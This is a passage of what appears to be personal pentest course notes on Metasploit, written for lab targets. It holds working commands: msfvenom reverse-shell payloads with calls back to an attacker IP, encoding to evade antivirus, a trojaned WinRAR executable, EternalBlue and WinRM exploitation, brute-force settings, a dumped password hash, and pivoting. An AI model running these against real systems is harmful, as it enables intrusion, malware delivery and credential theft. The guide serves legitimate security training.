[+] 192.127.196.3:22 - SSH - User 'sysadmin' found
[+] 192.127.196.3:22 - SSH - User 'rooty' found
[+] 192.127.196.3:22 - SSH - User 'demo' found
[+] 192.127.196.3:22 - SSH - User 'auditor' found
[+] 192.127.196.3:22 - SSH - User 'anon' found
[+] 192.127.196.3:22 - SSH - User 'administrator' found
[+] 192.127.196.3:22 - SSH - User 'diag' found
```

#### [SMTP](../assessment-methodologies/3-enumeration/smtp-enum.md)

> 🔬 [SMTP - Postfix Recon: Basics](https://www.attackdefense.com/challengedetails?cid=516)

```bash
ip -br -c a
setg RHOSTS 192.8.115.3
setg RHOST 192.8.115.3
workspace -a SMTP_ENUM
# Run a portscan to identify SMTP port, in this case is port 25
```

> **`auxiliary/scanner/smtp/smtp_enum`**

```bash
search type:auxiliary name:smtp
use auxiliary/scanner/smtp/smtp_enum
options
run
```

```bash
[+] 192.63.243.3:25 - 192.63.243.3:25 Users found: , admin, administrator, backup, bin, daemon, games, gnats, irc, list, lp, mail, man, news, nobody, postmaster, proxy, sync, sys, uucp, www-data
```

> **`auxiliary/scanner/smtp/smtp_version`**

```bash
search type:auxiliary name:smtp
use auxiliary/scanner/smtp/smtp_version
options
run
```

```bash
[+] 192.8.115.3:25 - 192.8.115.3:25 SMTP 220 openmailbox.xyz ESMTP Postfix: Welcome to our mail server.\x0d\x0a
```

## Vulnerability Scanning With MSF

MSF **Auxiliary** and **exploit** modules can be utilized to identify inherent vulnerabilities in services, O.S. and web apps.

- Useful in the **Exploitation** phase of the pentest

🔬 [Metasploitable3](https://github.com/rapid7/metasploitable3) lab environment will be used for the vulnerability scanning demonstration.

- **Metasploitable3** is a vulnerable virtual machine developed by Rapid7, intended to be used as a vulnerable target for testing exploits with Metasploit.

> 🔬 You can find my lab installation & configuration with Vagrant at [this page](https://blog.syselement.com/home/home-lab/redteam/metasploitable3), *set up for educational purposes*.

- Kali Linux attacker machine must be configured with **the same local network** of the Metasploitable3 VMs.

Detect active hosts on the local network, from the Kali VM:

```bash
sudo nmap -sn 192.168.31.0/24
```

```bash
Nmap scan report for 192.168.31.139 # Linux target
Nmap scan report for 192.168.31.140 # Windows2008 target
```

- Run Metasploit:

```bash
service postgresql start && msfconsole -q
```

```bash
db_status
setg RHOSTS 192.168.31.140
setg RHOST 192.168.31.140
workspace -a VULN_SCAN_MS3
```

- **Service version** is a key piece of information for the vulnerabilities scanning. Use the **`db_nmap`** command inside the MSF

```bash
db_nmap -sS -sV -O 192.168.31.140
```

```bash
[*] Nmap: 21/tcp    open  ftp Microsoft ftpd
[*] Nmap: 22/tcp    open  ssh OpenSSH 7.1 (protocol 2.0)
[*] Nmap: 80/tcp    open  http Microsoft IIS httpd 7.5
[*] Nmap: 135/tcp   open  msrpc Microsoft Windows RPC
[*] Nmap: 139/tcp   open  netbios-ssn Microsoft Windows netbios-ssn
[*] Nmap: 445/tcp   open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
[*] Nmap: 3306/tcp  open  mysql MySQL 5.5.20-log
[*] Nmap: 3389/tcp  open  tcpwrapped
[*] Nmap: 4848/tcp  open  ssl/http Oracle GlassFish 4.0 (Servlet 3.1; JSP 2.3; Java 1.8)
[*] Nmap: 7676/tcp  open  java-message-service Java Message Service 301
[*] Nmap: 8009/tcp  open  ajp13 Apache Jserv (Protocol v1.3)
[*] Nmap: 8080/tcp  open  http Oracle GlassFish 4.0 (Servlet 3.1; JSP 2.3; Java 1.8)
[*] Nmap: 8181/tcp  open  ssl/http Oracle GlassFish 4.0 (Servlet 3.1; JSP 2.3; Java 1.8)
[*] Nmap: 8383/tcp  open  http Apache httpd
[*] Nmap: 9200/tcp  open  wap-wsp?
[*] Nmap: 49152/tcp open  msrpc Microsoft Windows RPC
[*] Nmap: 49153/tcp open  msrpc Microsoft Windows RPC
[*] Nmap: 49154/tcp open  msrpc Microsoft Windows RPC
[*] Nmap: 49155/tcp open  msrpc Microsoft Windows RPC
[...]
```

![db_nmap](hostnetwork-penetration-testingassets/image-20230413200524969.png)

```bash
hosts
services
```

- Manually search for a specific exploit
  - Check if there are any exploits for a particular **version** of a service

```bash
search type:exploit name:iis
```

![search type:exploit name:iis](hostnetwork-penetration-testingassets/image-20230413192845621.png)

```bash
search Sun GlassFish
```

- Check if a module will work on the specific version of the service

```bash
use exploit/multi/http/glassfish_deployer
info

# Description:
#   This module logs in to a GlassFish Server (Open Source or
#   Commercial) using various methods (such as authentication bypass,
#   default credentials, or user-supplied login), and deploys a
#   malicious war file in order to get remote code execution. It has
#   been tested on Glassfish 2.x, 3.0, 4.0 and Sun Java System
#   Application Server 9.x. Newer GlassFish versions do not allow remote
#   access (Secure Admin) by default, but is required for exploitation.
```

```bash
set payload windows/meterpreter/reverse_tcp
options
# check the LHOST, LPORT, APP_RPORT, RPORT, PAYLOAD options
```

- Use [searchsploit](https://www.exploit-db.com/searchsploit) tool from the Kali terminal, instead of `search MSF command`, by displaying only the Metasploit exploit modules

```bash
searchsploit "Microsoft Windows SMB" | grep -e "Metasploit"
```

![](hostnetwork-penetration-testingassets/image-20230413194606641.png)

- Back in `msfconsole`, check if the server is vulnerable to MS17-010

```bash
search eternalblue
use auxiliary/scanner/smb/smb_ms17_010
run
```

![](hostnetwork-penetration-testingassets/image-20230413200558380.png)

```bash
use exploit/windows/smb/ms17_010_eternalblue
options
# always check Payload options
run
```

> [**metasploit-autopwn**](https://github.com/hahwul/metasploit-autopwn) - a Metasploit plugin for easy exploit & vulnerability attack.
>
> - *takes a look at the Metasploit database and provides a list of exploit modules to use for the already enumerated services* 

- On a Kali terminal

```bash
wget https://raw.githubusercontent.com/hahwul/metasploit-autopwn/master/db_autopwn.rb
sudo mv db_autopwn.rb /usr/share/metasploit-framework/plugins/
```

- On `msfconsole`

```bash
load db_autopwn
```

```bash
db_autopwn -p -t
# Enumerates exploits for each of the open ports
```

```bash
db_autopwn -p -t -PI 445
# Limit to only the 445 port
```

![db_autopwn -p -t -PI 445](hostnetwork-penetration-testingassets/image-20230413202435550.png)

- On `msfconsole` use the **`analyze`** command to auto analyze the contents of the MSFdb (hosts & services) 

```
analyze
```

![analyze](hostnetwork-penetration-testingassets/image-20230413202708057.png)

```bash
vulns
```

![vulns](hostnetwork-penetration-testingassets/image-20230413202802181.png)

### VA with [Nessus](https://www.offsec.com/metasploit-unleashed/working-with-nessus/)

> 🔬 You can find my [**Nessus Essentials** install tutorial here](https://blog.syselement.com/home/operating-systems/linux/tools/nessus).

- A vulnerability scan with Nessus result can be imported into the MSF for analysis and exploitation.
- Nessus Essentials free version allows to scan up to 16 IPs.

Start Nessus Essentials on the Kali VM, login and create a New **Basic Network Scan** and run it.

Wait for the scan conclusion and export the results with the **Export/Nessus** button.

 ![Nessus Essentials - Metasploitable3](hostnetwork-penetration-testingassets/image-20230413222104319.png)

- Open the `msfconsole` terminal and import the Nessus results
  - Check the information from the scan results with the `hosts`, `services`, `vulns` commands

```bash
workspace -a MS3_NESSUS
db_import /home/kali/Downloads/MS3_zph3t5.nessus
hosts
services
vulns
```

![](hostnetwork-penetration-testingassets/image-20230413222333897.png)

```bash
vulns -p 445
```

![](hostnetwork-penetration-testingassets/image-20230413222411974.png)

```bash
search cve:2017 name:smb
search MS12-020
search cve:2019 name:rdp
search cve:2015 name:ManageEngine
search PHP CGI Argument Injection
```

### VA with [WMAP](https://www.offsec.com/metasploit-unleashed/wmap-web-scanner/)

🗒️ **WMAP** is a web application vulnerability scanner that allows to conduct and automate web server enumeration and scanning from within the Metasploit Framework.

- Available as a fully integrated MSF plugin
- Utilizes the in-built MSF auxiliary modules

> 🔬 The lab is the same one from the HTTP Metasploit Enumeration section above - [Metasploit - Apache Enumeration Lab](https://www.attackdefense.com/challengedetails?cid=118)

```bash
ip -br -c a
	192.28.60.3
	# Target IP

service postgresql start && msfconsole -q
```

```bash
db_status
setg RHOSTS 192.28.60.3
setg RHOST 192.28.60.3
workspace -a WMAP_SCAN
```

- Load WMAP extension within `msfconsole`

```bash
load wmap
```

![load wmap](hostnetwork-penetration-testingassets/image-20230415164951596.png)

- Add WMAP site

```bash
wmap_sites -a 192.28.60.3
```

- Specify the target URL

```bash
wmap_targets -t http://192.28.60.3
```

```bash
wmap_sites -l
wmap_targets -l
```

- Show only the MSF modules that will be able to be run against target

```bash
wmap_run -t
```

- Run the **web app vulnerability scan**
  - this will run all enabled modules against the target web server

```bash
wmap_run -e
```

- *Analyze the results produced by WMAP.* 

![wmap_run -t](hostnetwork-penetration-testingassets/image-20230415165930386.png)

![wmap_run -e](hostnetwork-penetration-testingassets/image-20230415170207090.png)

- List WMAP found vulnerabilities

```bash
wmap_vulns -l
```

- Since the allowed methods are `POST`, `OPTIONS`, `GET`, `HEAD`, exploit the vulnerability with the use of `auxiliary/scanner/http/http_put` module to upload a file into the `/data` directory
  - 📌 A reverse shell payload can be uploaded and run on the target.

```bash
use auxiliary/scanner/http/http_put
options
set PATH /data/
set FILEDATA "File uploaded"
set FILENAME file.txt
run
```

![Metasploit - auxiliary/scanner/http/http_put](hostnetwork-penetration-testingassets/image-20230415171358249.png)

- Test if the file has been uploaded correctly

```bash
curl http://192.28.60.3:80/data/file.txt
```

## [Client-Side Attacks](https://www.offsec.com/metasploit-unleashed/client-side-attacks/) with MSF

A **client-side attack** is a security breach that happens on the client side.

- Social engineering techniques take advantage of human vulnerabilities
- Require user-interaction to open malicious documents or portable executables (**`PEs`**)
- The payload is stored on the client's system
- Attackers have to pay attention to Anti Virus detection

> ❗ ***Advanced modern antivirus solutions detects and blocks this type of payloads very easily.***

### [Msfvenom](https://www.offsec.com/metasploit-unleashed/msfvenom/) Payloads

> [**`msfvenom`**](https://www.kali.org/tools/metasploit-framework/#msfvenom) - a Metasploit standalone payload generator and encoder
>
> - **`e.g.`** - generate a malicious meterpreter payload, transfer it to a client target; once executed it will connect back to the payload handler and provides with remote access

- List available payloads

```bash
msfvenom --list payloads
```

- When generating a payload the exact name of the payload must be specified
  - target operating system
  - target O.S. architecture (x64, x86 ...)
  - payload type
  - protocol used to connect back (depends on requirements)

![](hostnetwork-penetration-testingassets/image-20230415190726950.png)

**`e.g.`** of **Staged payload**

- `windows/x64/meterpreter/reverse_tcp`

**`e.g.`** of **Non-Staged payload**

- `windows/x64/meterpreter_reverse_https`

![](hostnetwork-penetration-testingassets/image-20230415191239575.png)

- Generate a Windows payload with `msfvenom`

**32bit payload:**

```bash
msfvenom -a x86 -p windows/meterpreter/reverse_tcp LHOST=192.168.31.128 LPORT=1234 -f exe > /home/kali/certs/ejpt/Windows_Payloads/payloadx86.exe

# LHOST = Attacker IP address
```

**64bit payload:**

```bash
msfvenom -a x64 -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.31.128 LPORT=1234 -f exe > /home/kali/certs/ejpt/Windows_Payloads/payloadx64.exe
```

- List the output formats available

```bash
msfvenom --list formats
```

```bash
Framework Executable Formats [--format <value>]
===============================================
    Name
    ----
    asp
    aspx
    aspx-exe
    axis2
    dll
    ducky-script-psh
    elf
    elf-so
    exe
    exe-only
    exe-service
    exe-small
    hta-psh
    jar
    jsp
    loop-vbs
    macho
    msi
    msi-nouac
    osx-app
    psh
    psh-cmd
    psh-net
    psh-reflection
    python-reflection
    vba
    vba-exe
    vba-psh
    vbs
    war

Framework Transform Formats [--format <value>]
==============================================
    Name
    ----
    base32
    base64
    bash
    c
    csharp
    dw
    dword
    go
    golang
    hex
    java
    js_be
    js_le
    nim
    nimlang
    num
    perl
    pl
    powershell
    ps1
    py
    python
    raw
    rb
    ruby
    rust
    rustlang
    sh
    vbapplication
    vbscript
```

- Generate a Linux payload with `msfvenom`

**32bit payload:**

```bash
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.31.128 LPORT=1234 -f elf > /home/kali/certs/ejpt/Linux_Payloads/payloadx86
```

**64bit payload:**

```bash
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.31.128 LPORT=1234 -f elf > /home/kali/certs/ejpt/Linux_Payloads/payloadx64
```

- 📌 *Platform and architecture are auto selected if not specified, based on the selected payload*

![](hostnetwork-penetration-testingassets/image-20230415192514206.png)

The transferring method onto the target system depends on the type of the social engineering technique.

- **`e.g.`** A simple web server can be set up on the attacker system to serve the payload files and a handler to receive the connection back from the target system

```bash
cd /home/kali/certs/ejpt/Windows_Payloads
sudo python -m http.server 8080
```

- To deal with a `meterpreter` payload, an appropriate listener is necessary to handle the reverse connection, the `multi/handler` Metasploit module in this case

```bash
msfconsole -q
```

```bash
use multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST 192.168.31.128
set LPORT 1234
run
```

- Download the payload on the Windows 2008 system (in this case my home lab VM) from this link

  - `http://192.168.31.128:8080`
  - Run the `payloadx86.exe` payload on the target
- The `meterpreter` session on the attacker machine should be opened

![](hostnetwork-penetration-testingassets/image-20230415200856110.png)

Same example with the `linux/x86/meterpreter/reverse_tcp` Linux payload executed on the Kali VM.

![](hostnetwork-penetration-testingassets/image-20230415201253314.png)

### Encoding Payloads

Signature based Antivirus solutions can detect malicious files or executables. Older AV solutions can be evaded by **encoding** the payloads.

- ❗ *This kind of attack vector is outdated and hardly used today*.
- May work on legacy old O.S. like Windows 7 or older.

🗒️ Payload **Encoding** involves changing the payload shellcode *with the aim of changing the payload signature*.

-  [Encoding will not always avoid detection](https://docs.rapid7.com/metasploit/encoded-payloads-bypassing-anti-virus)

🗒️ **Shellcode** is the code typically used as a *payload* for exploitation, that provides with a remote *command shell* on the target system.

```bash
msfvenom --list encoders
```

![msfvenom --list encoders](hostnetwork-penetration-testingassets/image-20230415212307184.png)

- Excellent encoders are **`cmd/powershell_base64`** and **`x86/shikata_ga_nai`**

#### Windows Payload

- Generate a Win x86 payload and encode it with `shikata_ga_nai`:

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.31.128 LPORT=1234 -e x86/shikata_ga_nai -f exe > /home/kali/certs/ejpt/Windows_Payloads/encodedx86.exe
```

![msfvenom shikata_ga_nai Win](hostnetwork-penetration-testingassets/image-20230415213830109.png)

- The payload can be encoded as often as desired by increasing the number of iterations.
- The more iterations, the better chances to bypass an Antivirus. Use **`-i`** option.

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.31.128 LPORT=1234 -i 10 -e x86/shikata_ga_nai -f exe > /home/kali/certs/ejpt/Windows_Payloads/encodedx86.exe
```

![](hostnetwork-penetration-testingassets/image-20230415213941131.png)

#### Linux Payload

```bash
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.31.128 LPORT=1234 -i 10 -e x86/shikata_ga_nai -f elf > /home/kali/certs/ejpt/Linux_Payloads/encodedx86    
```

![msfvenom shikata_ga_nai Linux](hostnetwork-penetration-testingassets/image-20230415213215234.png)

- Test each of the above generated payloads, like before

```bash
cd /home/kali/certs/ejpt/Windows_Payloads
sudo python -m http.server 8080
msfconsole -q

use multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST 192.168.31.128
set LPORT 1234
run
```

![](hostnetwork-penetration-testingassets/image-20230415213745031.png)

> 📌 Modern antivirus detects and blocks the encoded payload as soon as the download is started:
>
> ![](hostnetwork-penetration-testingassets/image-20230415214414552.png)

### Injecting Payloads into PEs

🗒️ [Windows **Portable Executable**]() (**PE**) *is a file format for executables, object code, DLLs and others, used in 32-bit and 64-bit Windows O.S.*

- Download a portable executable, **`e.g.`** [WinRAR](https://www.win-rar.com/download.html)

- Payloads can be injected into PEs with `msfvenom` with the **`-x`** and **`-k`** options

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.31.128 LPORT=1234 -e x86/shikata_ga_nai -i 10 -f exe -x winrar-x32-621.exe > /home/kali/certs/ejpt/Windows_Payloads/winrar.exe
```

![](hostnetwork-penetration-testingassets/image-20230415220833685.png)

```bash
cd /home/kali/certs/ejpt/Windows_Payloads
sudo python -m http.server 8080
msfconsole -q

use multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST 192.168.31.128
set LPORT 1234
run
```

- Transfer and run the `winrar.exe` file to the target O.S.
- File description is kept, but not its functionality.

![](hostnetwork-penetration-testingassets/image-20230415221016113.png)

![](hostnetwork-penetration-testingassets/image-20230415221130544.png)

- Proceed with the Post Exploitation module to migrate the process into another one, in the `meterpreter` session

```bash
run post/windows/manage/migrate
```

![](hostnetwork-penetration-testingassets/image-20230415221432202.png)

### Automation with [Resource Scripts](https://www.offsec.com/metasploit-unleashed/writing-meterpreter-scripts/)

Repetitive tasks and commands can be automated using **MSF resource scripts** (same as batch scripts).

- Almost every MSF command can be automated.

```bash
ls -al /usr/share/metasploit-framework/scripts/resource
```

![/usr/share/metasploit-framework/scripts/resource](hostnetwork-penetration-testingassets/image-20230415222643575.png)

**`e.g. 1`**

- *Automate the process of setting up a handler for the generated payloads*, by creating a new `handler.rc` file

```bash
nano handler.rc

# Insert the following lines
# by specifying the commands sequentially

use multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST 192.168.31.128
set LPORT 1234
run

# Save it and exit
```

- Load and run the recourse script in `msfconsole`

```bash
msfconsole -q -r handler.rc
```

![msfconsole -q -r handler.rc](hostnetwork-penetration-testingassets/image-20230415223258567.png)

**`e.g. 2`**

```bash
nano portscan.rc

# Insert the following lines
# by specifying the commands sequentially

use auxiliary/scanner/portscan/tcp
set RHOSTS 192.168.31.131
run

# Save it and exit
```

```bash
msfconsole -q -r portscan.rc
```

![msfconsole -q -r portscan.rc](hostnetwork-penetration-testingassets/image-20230415223936432.png)

**`e.g. 3`**

```bash
nano db_status.rc

db_status
workspace
workspace -a TEST
```

```bash
msfconsole -q -r db_status.rc
```

![](hostnetwork-penetration-testingassets/image-20230415224235665.png)

- 📌 Load up a resource script from within the `msfconsole` with the **`resource`** command

```bash
resource /home/kali/certs/ejpt/resource_scripts/handler.rc
```

- Typed in commands in a new `msfconsole` session, can be exported in a new resource script

```bash
makerc /home/kali/certs/ejpt/resource_scripts/portscan2.rc
```

![](hostnetwork-penetration-testingassets/image-20230415224836969.png)

## [Exploitation](https://www.offsec.com/metasploit-unleashed/exploits/) with MSF

### HFS (HTTP File Server)

A **HFS** (HTTP File Server) is a file and documents sharing web server.

- Rejetto HFS - free open source HTTP file server

> 🔬 [HFS - MSF Exploit](3-metasploit/hfs-msf-exp.md)

### SMB - MS17-010 EternalBlue

- [CVE-2017-0144](https://nvd.nist.gov/vuln/detail/CVE-2017-0144)
- [EternalBlue VA](../assessment-methodologies/4-va.md#eternalblue)
  - **EternalBlue** takes advantage of a Windows SMBv1 protocol vulnerability
  - Patch was released in March 2017

> 🔬 Check the [Lab 2 - Eternal Blue here](1-system-attack/windows-attacks/smb-psexec.md)

- Some MSF useful commands from my Home Lab (`Kali VM + Win 2008_R2 Server`)

```bash
service postgresql start && msfconsole -q
```

```bash
db_status
setg RHOSTS 192.168.31.131
setg RHOST 192.168.31.131
workspace -a EternalBlue

db_nmap -sS -sV -O 192.168.31.131
```

```bash
search type:auxiliary EternalBlue
use auxiliary/scanner/smb/smb_ms17_010
options
run

search type:exploit EternalBlue
use exploit/windows/smb/ms17_010_eternalblue
options
run
```

### WinRM

- Identify WinRM users with MSF and exploit WinRM by obtaining access credentials.
- Default WinRM HTTP port is **`5985`** and HTTPS **`5986`**

> 🔬 [WinRM Attack lab](1-system-attack/windows-attacks/winrm.md)

```bash
service postgresql start && msfconsole -q
```

```bash
db_status
setg RHOSTS 10.2.27.173
setg RHOST 10.2.27.173
workspace -a WinRM

db_nmap -sS -sV -O -p- 10.2.27.173
# Port 5985 is set up for WinRM
```

```bash
search type:auxiliary winrm
use auxiliary/scanner/winrm/winrm_auth_methods
options
run

# Brute force WinRM login
search winrm_login
use auxiliary/scanner/winrm/winrm_login
set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt

search winrm_cmd
use auxiliary/scanner/winrm/winrm_cmd
set USERNAME administrator
set PASSWORD tinkerbell
set CMD whoami
run
```

![](hostnetwork-penetration-testingassets/image-20230416114857268.png)

```bash
search winrm_script
use exploit/windows/winrm/winrm_script_exec
set USERNAME administrator
set PASSWORD tinkerbell
set FORCE_VBS true
exploit
```

### Apache Tomcat

[**`Apache Tomcat`**](https://tomcat.apache.org/) is a free open source Java servlet web server, *build to host dynamic websites and web apps developed in **Java***.

- Tomcat default TCP port is **`8080`**
- Apache web server host HTML/PHP web apps, instead
- Apache Tomcat < **`v.8.5.23`** is vulnerable to a JSP Upload Bypass / RCE

> 🔬 [Tomcat - MSF Exploit](3-metasploit/tomcat-msf-exp.md)

### FTP

[**`vsftpd`**](https://security.appspot.com/vsftpd.html) is an Unix FTP server.

- vsftpd **`v.2.3.4`** is vulnerable to a command execution vulnerability

> 🔬 [FTP - MSF Exploit](3-metasploit/ftpd-msf-exp.md)

### SAMBA

**`Samba`** is the Linux implementation of SMB.

- Samaba **`v.3.5.0`** is vulnerable to a RCE vulnerability

> 🔬 [Samba - MSF Exploit](3-metasploit/samba-msf-exp.md)

### SSH

**`libssh`** is a C library that implements the SSHv2 protocol

- **`SSH`** default TCP port is **`22`**
- libssh **`v.0.6.0 - 0.8.0`** is vulnerable to an authentication bypass vulnerability

> 🔬 [SSH - MSF Exploit](3-metasploit/ssh-msf-exp.md)

### SMTP

[**`Haraka`**](https://haraka.github.io/) is an open source high performance SMTP server developed in `Node.js`

- **`SMTP`** default TCP port is **`25`**
  - other TCP ports are **`465`** and **`587`**
- Haraka prior to **`v.2.8.9`** is vulnerable to command injection

> 🔬 [SMTP - MSF Exploit](3-metasploit/smtp-msf-exp.md)

## [Post Exploitation](https://www.offsec.com/metasploit-unleashed/msf-post-exploitation/) with MSF

🗒️ **Post Exploitation** is the process of gaining further information or access to the target's internal network, after the initial exploitation phase, using various techniques like:

- **local enumeration**
- [**privilege escalation**](https://www.offsec.com/metasploit-unleashed/privilege-escalation/)
- **maintaining persistent access**
- [**pivoting**](https://www.offsec.com/metasploit-unleashed/pivoting/)
- **dumping hashes**
- **covering tracks**

There are many post exploitation modules provided by the MSF.

🗒️ **Persistence** consists of techniques used by adversaries *to maintain access to systems across restarts, changed credentials, or other interruptions*.

🗒️ **[Keylogging](https://www.offsec.com/metasploit-unleashed/keylogging/)** is the action of (secretly) *recording/capturing the keystrokes entered on a target system*.

🗒️ **Pivoting** is a post exploitation technique of using a compromised host, a **`foothold`** / **`plant`**, to attack other systems on its private internal network.

### Fundamentals - [Meterpreter](https://www.offsec.com/metasploit-unleashed/about-meterpreter/)

- Facilitates the execution of system commands, file system navigation, keylogging
- Load custom scripts and plugins dynamically
- 📌 **MSF has various types of `Meterpreter` payloads based on the target environment**

> 🔬 Check the [Meterpreter Labs](3-metasploit/meterpreter-msf.md) for various `Meterpreter` commands and techniques examples and how to upgrade shells to Meterpreter sessions.

### Windows PE Modules

Windows post exploitation MSF modules can be used to:

- Enumerate user privileges, logged-on users, installed programs, antiviruses, computers connected to a domain, installed patches and shares
- VM check

🗒️ **Windows Event Logs**, accessed via the `Event Viewer` on Windows, are categorized into:

- `Application logs` - apps startups, crashes, etc
- `System logs` - system startups, reboots, etc
- `Security logs` - password changes, authentication failures/success, etc

Clearing event logs is an important part of the system assessment.

> 🔬 Check out the [Windows Post Exploitation with MSF Labs](3-metasploit/win-post-msf.md) with **post-exploitation** techniques for various *Windows services*.

### Linux PE Modules

Linux post exploitation MSF modules can be used to:

- Enumerate system configuration, environment variables, network configuration, user's history
- VM check

> 🔬 Check out the [Linux Post Exploitation with MSF Labs](3-metasploit/linux-post-msf.md) with **post-exploitation** techniques for various *Unix services*.

## [Armitage](https://www.offsec.com/metasploit-unleashed/armitage/) - MSF GUI

🗒️ **Armitage** is a Java-based GUI front-end for the MSF.

- Automate port scanning, exploitation, post exploitation
- Visualize targets
- Requires MSFdb and services to be running
- Pre-packed with Kali Linux

> 🔬 **Port Scanning & Enumeration With Armitage** - lab by INE
>
> - Victim Machine 1: `10.2.21.86`
> - Victim Machine 2: `10.2.25.150`

```bash
service postgresql start && msfconsole -q
db_status
	[*] Connected to msf. Connection type: postgresql.

# Open a new tab and start Armitage
armitage
# Answer "YES" for the RPC server
```

![Armitage](hostnetwork-penetration-testingassets/image-20230422172326118.png)

- **Hosts - Add Hosts**
  - Add victim 1 IP
  - Set the lab as `Victim 1`
- Right-click the target and **Scan** it

![](hostnetwork-penetration-testingassets/image-20230422172731476.png)

- Check **Services**
- Perform an **Nmap Scan** from the **Hosts** menu

![](hostnetwork-penetration-testingassets/image-20230422173026361.png)

- Check **Services**

![](hostnetwork-penetration-testingassets/image-20230422173127590.png)

### Exploitation

- Search for `rejetto` and launch the exploit module

![](hostnetwork-penetration-testingassets/image-20230422173456328.png)

![](hostnetwork-penetration-testingassets/image-20230422173621170.png)

- Try **Dump Hashes** via the `registry method`

![Metasploit - post/windows/gather/smart_hashdump](hostnetwork-penetration-testingassets/image-20230422174938564.png)

- Saved hashes can be found under the **View - Loot** menu

```bash
Administrator:500:aad3b435b51404eeaad3b435b51404ee:5c4d59391f656d5958dab124ffeabc20:::
```

- **Browse Files**

![](hostnetwork-penetration-testingassets/image-20230422175355019.png)

- **Show Processes**

![](hostnetwork-penetration-testingassets/image-20230422175459608.png)

### Pivoting

- Setup **Pivoting**

![](hostnetwork-penetration-testingassets/image-20230422175630076.png)

- Add, Enumerate and Exploit `Victim 2`

![](hostnetwork-penetration-testingassets/image-20230422180124226.png)

- Port forward the port `80` and use `nmap`

```bash
# In the Meterpreter tab
portfwd add -l 1234 -p 80 -r 10.2.25.150
```

```bash
# In the msf Console tab
db_nmap -sV -p 1234 localhost
```

![](hostnetwork-penetration-testingassets/image-20230422180508381.png)

- Remove the created localhost `127.0.0.1`
- Search for `BadBlue` and use the `badblue_passthru` exploit on `Victim 2`

![](hostnetwork-penetration-testingassets/image-20230422181450963.png)

- Migrate to an `x64` from the **Processes** tab
- Dump hashes with the `lsass method`

### Armitage Kali Linux Install

```bash
sudo apt install armitage -y
```

```bash
sudo msfdb init
```

```bash
sudo nano /etc/postgresql/15/main/pg_hba.conf
# On line 87 switch “scram-sha-256” to “trust”
```

```bash
sudo systemctl enable postgresql
sudo systemctl restart postgresql
```

```bash
sudo armitage
```

------

